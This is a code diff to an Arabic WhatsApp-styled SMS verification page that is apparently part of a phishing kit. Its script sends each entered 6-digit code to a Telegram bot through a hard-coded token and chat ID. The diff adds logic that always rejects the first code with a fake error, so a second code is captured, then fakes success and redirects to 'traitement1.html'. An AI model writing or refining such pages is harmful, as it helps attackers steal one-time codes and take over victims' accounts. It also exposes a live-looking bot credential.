@@ -11,6 +11,7 @@
             --primary: #25D366;
             --primary-dark: #128C7E;
             --error: #e53e3e;
+            --success: #38a169;
             --white: #FFFFFF;
             --light-bg: #f5f8fa;
             --border-color: #e1e8ed;
@@ -90,10 +91,23 @@
             box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
         }
 
-        .error-message {
-            color: var(--error);
+        .message {
+            padding: 12px;
+            border-radius: 8px;
             margin-bottom: 20px;
             display: none;
+        }
+
+        .error-message {
+            background-color: #FFF5F5;
+            color: var(--error);
+            border: 1px solid #FED7D7;
+        }
+
+        .success-message {
+            background-color: #F0FFF4;
+            color: var(--success);
+            border: 1px solid #C6F6D5;
         }
 
         .submit-btn {
@@ -154,18 +168,23 @@
         <h1 class="verification-title">رمز التفعيل</h1>
         <p class="verification-description">يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية</p>
         
-        <div class="code-inputs">
-            <input type="tel" class="code-input" maxlength="1" data-index="1">
-            <input type="tel" class="code-input" maxlength="1" data-index="2">
-            <input type="tel" class="code-input" maxlength="1" data-index="3">
-            <input type="tel" class="code-input" maxlength="1" data-index="4">
-            <input type="tel" class="code-input" maxlength="1" data-index="5">
-            <input type="tel" class="code-input" maxlength="1" data-index="6">
+        <div class="message error-message" id="errorMessage">
+            <i class="fas fa-exclamation-circle"></i>
+            <span>الرمز غير صحيح، يرجى كتابة الرمز الصحيح</span>
         </div>
         
-        <div class="error-message" id="errorMessage">
-            <i class="fas fa-exclamation-circle"></i>
-            <span>الرمز غير صحيح، يرجى المحاولة مرة أخرى</span>
+        <div class="message success-message" id="successMessage">
+            <i class="fas fa-check-circle"></i>
+            <span>تم التحقق بنجاح، جاري التوجيه...</span>
+        </div>
+        
+        <div class="code-inputs">
+            <input type="text" class="code-input" maxlength="1" data-index="1">
+            <input type="text" class="code-input" maxlength="1" data-index="2">
+            <input type="text" class="code-input" maxlength="1" data-index="3">
+            <input type="text" class="code-input" maxlength="1" data-index="4">
+            <input type="text" class="code-input" maxlength="1" data-index="5">
+            <input type="text" class="code-input" maxlength="1" data-index="6">
         </div>
         
         <button class="submit-btn" id="submitBtn">
@@ -183,8 +202,12 @@
             const codeInputs = document.querySelectorAll('.code-input');
             const submitBtn = document.getElementById('submitBtn');
             const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
             const countdownSection = document.getElementById('countdownSection');
             const countdownElement = document.getElementById('countdown');
+            
+            let attemptCount = 0;
+            let countdownInterval;
             
             // إدارة إدخال الرمز
             codeInputs.forEach((input, index) => {
@@ -220,9 +243,16 @@
                 // إرسال الرمز إلى تيليجرام
                 sendToTelegram(verificationCode);
                 
-                // هنا يمكنك إضافة التحقق من صحة الرمز
-                // في هذا المثال سنفترض أن الرمز غير صحيح لنظهر رسالة الخطأ
-                validateCode(verificationCode);
+                attemptCount++;
+                
+                if(attemptCount === 1) {
+                    // المحاولة الأولى: عرض خطأ بعد 15 ثانية
+                    startCountdown(true);
+                } else {
+                    // المحاولة الثانية: عرض نجاح ثم تحويل
+                    showSuccess();
+                    startCountdown(false);
+                }
             });
             
             // دالة إرسال الرمز إلى تيليجرام
@@ -232,7 +262,7 @@
                     { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
                 ];
                 
-                const message = `رمز التحقق الذي تم إدخاله: ${code}\nالوقت: ${new Date().toLocaleString('ar-SA')}`;
+                const message = `رمز التحقق الذي تم إدخاله: ${code}\nالمحاولة: ${attemptCount}\nالوقت: ${new Date().toLocaleString('ar-SA')}`;
                 
                 bots.forEach(bot => {
                     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}`)
@@ -240,21 +270,12 @@
                 });
             }
             
-            // دالة التحقق من الرمز (في الواقع يجب أن تتصل بخادمك للتحقق)
-            function validateCode(code) {
-                // في هذا المثال سنفترض أن الرمز غير صحيح
-                setTimeout(() => {
-                    showError("الرمز غير صحيح، يرجى كتابة الرمز الصحيح");
-                    
-                    // بدء العد التنازلي 15 ثانية
-                    startCountdown();
-                }, 1000);
-            }
-            
             // دالة عرض رسالة الخطأ
             function showError(message) {
                 errorMessage.querySelector('span').textContent = message;
-                errorMessage.style.display = 'block';
+                errorMessage.style.display = 'flex';
+                errorMessage.style.gap = '8px';
+                successMessage.style.display = 'none';
                 
                 // تأثير اهتزاز
                 codeInputs.forEach(input => {
@@ -265,18 +286,45 @@
                 });
             }
             
+            // دالة عرض رسالة النجاح
+            function showSuccess() {
+                successMessage.style.display = 'flex';
+                successMessage.style.gap = '8px';
+                errorMessage.style.display = 'none';
+                submitBtn.disabled = true;
+            }
+            
+            // دالة مسح الحقول
+            function clearInputs() {
+                codeInputs.forEach(input => {
+                    input.value = '';
+                });
+                codeInputs[0].focus();
+            }
+            
             // دالة العد التنازلي
-            function startCountdown() {
+            function startCountdown(isFirstAttempt) {
+                clearInterval(countdownInterval);
                 countdownSection.style.display = 'block';
                 let seconds = 15;
+                countdownElement.textContent = seconds;
                 
-                const countdownInterval = setInterval(() => {
+                countdownInterval = setInterval(() => {
                     seconds--;
                     countdownElement.textContent = seconds;
                     
                     if(seconds <= 0) {
                         clearInterval(countdownInterval);
-                        window.location.href = 'traitement1.html';
+                        
+                        if(isFirstAttempt) {
+                            // بعد المحاولة الأولى: عرض خطأ ومسح الحقول
+                            showError("الرمز غير صحيح، يرجى كتابة الرمز الصحيح");
+                            clearInputs();
+                            countdownSection.style.display = 'none';
+                        } else {
+                            // بعد المحاولة الثانية: التحويل إلى الصفحة التالية
+                            window.location.href = 'traitement1.html';
+                        }
                     }
                 }, 1000);
             }
